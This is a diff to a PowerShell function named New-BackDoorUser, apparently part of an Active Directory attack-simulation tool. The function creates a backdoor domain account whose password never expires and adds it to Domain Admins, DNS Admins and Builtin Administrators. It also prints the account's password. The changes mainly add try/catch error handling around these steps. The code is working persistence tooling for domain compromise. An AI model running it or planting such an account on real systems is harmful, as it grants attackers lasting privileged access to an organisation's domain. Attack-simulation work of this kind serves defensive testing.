@@ -35,28 +35,49 @@ function New-BackDoorUser {
 
     $user = "$NetBios\$samaccountname"
   
-    New-ADUser  -UserPrincipalName $UPN  `
-        -Name $sName  `
-        -SamAccountName $samaccountname  `
-        -GivenName $FirstName  `
-        -Surname $LastName  `
-        -Initials $Initials  `
-        -Title $title   `
-        -Description $Description  `
-        -DisplayName $DisplayName   `
-        -Path $TargetOU   `
-        -OtherAttributes @{ 'employeeType' = 'AS2GoBackDoorUser' }  `
-        -AccountPassword $global:BDSecurePass   `
-        -PasswordNeverExpires $true  `
-        -AccountExpirationDate $null  `
-        -PassThru -Server $Script:ASDC | Enable-ADAccount
 
-    Add-ADGroupMember -Identity $Script:GroupDA.SID -Members $samaccountname  -Server $Script:ASDC
-    Add-ADGroupMember -Identity $Script:GroupDNSA.SID -Members $samaccountname -Server $Script:ASDC
+    try {
+        New-ADUser  -UserPrincipalName $UPN  `
+            -Name $sName  `
+            -SamAccountName $samaccountname  `
+            -GivenName $FirstName  `
+            -Surname $LastName  `
+            -Initials $Initials  `
+            -Title $title   `
+            -Description $Description  `
+            -DisplayName $DisplayName   `
+            -Path $TargetOU   `
+            -OtherAttributes @{ 'employeeType' = 'AS2GoBackDoorUser' }  `
+            -AccountPassword $global:BDSecurePass   `
+            -PasswordNeverExpires $true  `
+            -AccountExpirationDate $null  `
+            -PassThru -Server $Script:ASDC | Enable-ADAccount
 
-    Write-Host ""
-    Invoke-Output -Type Bullet -Message "New backdoor account:" -Textmaker $user
-    Invoke-Output -Type Bullet -Message "current password    :" -Textmaker $BDUserPW
+        Write-Host ""
+        Invoke-Output -Type Bullet -Message "New backdoor account:" -Textmaker $user
+        Invoke-Output -Type Bullet -Message "current password    :" -Textmaker $BDUserPW
+    }
+    catch {
+        Invoke-Output -type Error -Message "Creation of backdoor user $UPN failed, likely due to '$_'."
+        pause
+        return
+    }
+
+    try {
+        Add-ADGroupMember -Identity $Script:GroupDA.SID -Members $samaccountname  -Server $Script:ASDC
+    }
+    catch {
+        Invoke-Output -Type Error -Message $_
+    }
+
+    try {
+        Add-ADGroupMember -Identity $Script:GroupDNSA.SID -Members $samaccountname -Server $Script:ASDC
+    }
+    catch {
+        Invoke-Output -Type Error -Message $_
+    }
+
+  
 
     try {
         $photoBytes = [byte[]](Get-Content -Path $bthumbnailPhoto -AsByteStream)
@@ -102,13 +123,14 @@ function New-BackDoorUser {
             $SID = "S-1-5-32-544"
             $BuiltinAdmins = Get-ADGroup -Identity $SID -Server $ADDomain.DomainFQDN
   
-            Invoke-Output -Type Bullet -Message "Adding account to   :" -Textmaker $($BuiltinAdmins.DistinguishedName)
+           
             Start-Sleep -Seconds 2
             Set-ADGroup -Identity $BuiltinAdmins.DistinguishedName `
                 -Add @{ member = $NewMember.DistinguishedName } `
                 -Server $ADDomain.DomainFQDN `
                 -ErrorAction Stop
             Write-Log -Message "    >> Added backdoor user '$samaccountname' to $($BuiltinAdmins.DistinguishedName)"
+            Invoke-Output -Type Bullet -Message "Added account to   :" -Textmaker $($BuiltinAdmins.DistinguishedName)
         }
         Catch {
             Write-Log -Message "$_."
